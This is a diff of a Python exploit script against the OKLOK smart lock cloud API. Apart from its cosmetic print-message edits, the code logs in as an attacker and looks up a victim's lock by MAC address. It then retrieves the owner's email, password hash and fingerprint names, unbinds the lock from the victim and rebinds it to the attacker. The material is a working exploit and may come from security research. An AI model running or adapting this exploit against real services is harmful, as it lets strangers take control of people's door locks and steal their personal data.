@@ -28,15 +28,17 @@ def login_attacker(attacker_email_address, attacker_password):
     'Accept-Encoding': 'gzip, deflate, br'}
 
     print('\n-------------------------------------------------------------')
-    print('Logging in...')
+    print('[*] Logging in...')
 
     
     response = requests.post(url, data=json.dumps(body), headers=login_headers)
     json_resp = response.json()
     status = json_resp['status']
     if status == '2000':
-        print('Login successful!\n')
-        print('Login Details:')
+        print('[*] Login successful\n')
+        print('=============================================================')
+        print('ATTACKER LOGIN DETAILS:')
+        print('=============================================================')
         result = json_resp['result']
         attacker_token = result['token']
         attacker_userID = result['userId']
@@ -46,7 +48,7 @@ def login_attacker(attacker_email_address, attacker_password):
         return attacker_token, attacker_userID
 
     else:
-        sys.exit('Login not successful.')
+        sys.exit('[*] Login not successful.')
 
 #retrieve lockId, barcode, lock name
 def device_query(attacker_token, victim_mac, headers):
@@ -54,7 +56,7 @@ def device_query(attacker_token, victim_mac, headers):
     url = 'https://app.oklok.com.cn/oklock/lock/queryDevice'
     body = {"mac":victim_mac}
 
-    print('Querying device...')
+    print('[*] Querying device MAC...')
     response = requests.post(url, data=json.dumps(body), headers=headers)
     json_resp = response.json()
     result = json_resp['result']
@@ -63,8 +65,7 @@ def device_query(attacker_token, victim_mac, headers):
         lockId = result['id']
         barcode = result['barcode']
         name = result['name']
-        print('Query successful.')
-        print('-------------------------------------------------------------\n')
+        print('[*] Query successful.\n')
     else:
         sys.exit('HTTP Error -- Query not successful.')
     return lockId, barcode, name
@@ -75,7 +76,7 @@ def device_info(barcode, attacker_token, headers):
     url = 'https://app.oklok.com.cn/oklock/lock/getDeviceInfo'
     body = {"barcode":barcode}
 
-    print('Getting userId...')
+    print('[*] Getting userId from barcode...')
     response = requests.post(url, data=json.dumps(body), headers=headers)
     json_resp = response.json()
     result = json_resp['result']
@@ -83,8 +84,7 @@ def device_info(barcode, attacker_token, headers):
     if status == '2000':
         userId = result['userId']
         email = result['account']
-        print('Query successful.')
-        print('-------------------------------------------------------------\n')
+        print('[*] Query successful.\n')
 
     else:
         sys.exit('HTTP Error -- Query not successful.')
@@ -112,7 +112,7 @@ def get_more_info(victim_userID, attacker_token, lockId, headers):
     prints_result = json_prints_info['result']
     prints_status = json_prints_info['status']
 
-    print('Getting more user info...')
+    print('[*] Getting more user info...')
     if user_status == '2000':
         if len(user_result)!=0:
             acct_creation = user_result['createAt']
@@ -121,16 +121,15 @@ def get_more_info(victim_userID, attacker_token, lockId, headers):
             password_hash = user_result['password']
             qrUrl = user_result['qrUrl']
             picUrl = user_result['picUrl']
-            print('Retrieved more user info.')
-            print('-------------------------------------------------------------\n')
+            print('[*] Retrieved more user info.\n')
     else:
         print('HTTP Error - Could not retrieve more user info.')
           
-    print('Getting fingerprints info...')  
+    print('[*] Getting fingerprints info...')  
     if prints_status == '2000':
         if len(prints_result)!=0:
             prints_name = prints_result[0]['name']
-            print('Retrieved fingerprint info.')
+            print('[*] Retrieved fingerprint info.\n')
         else:
             prints_name = 'N/A'
     else:
@@ -144,15 +143,13 @@ def unbind(userId, lockId, attacker_token, headers):
     url = 'https://app.oklok.com.cn/oklock/lock/unbind'
     body = {"userId":userId,"lockId":lockId}
 
-    print('-------------------------------------------------------------\n')
-    print('Unbinding lock from victim...')
+    print('[*] Unbinding lock from victim...')
 
     response = requests.post(url, data=json.dumps(body), headers=headers)
     json_resp = response.json()
     status = json_resp['status']
     if status == '2000':
-        print('Success!')
-        print('-------------------------------------------------------------\n')
+        print('[*] Success!\n')
     else:
         sys.exit('HTTP Error Code -- Lock could not be unbound from victim.')
 
@@ -162,14 +159,13 @@ def bind(attacker_userID, mac, name, attacker_token, headers):
     url = 'https://app.oklok.com.cn/oklock/lock/bind'
     body = {"isLock":"1","userId": attacker_userID,"mac":mac,"name":name}
 
-    print('Binding lock to attacker...')
+    print('[*] Binding lock to attacker...')
 
     response = requests.post(url, data=json.dumps(body), headers=headers)
     json_resp = response.json()
     status = json_resp['status']
     if status == '2000':
-        print('Success!')
-        print('-------------------------------------------------------------\n')
+        print('[*] Success!\n')
     else:
         sys.exit('HTTP Error -- Lock could not be bound to attacker.')
 
@@ -253,4 +249,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
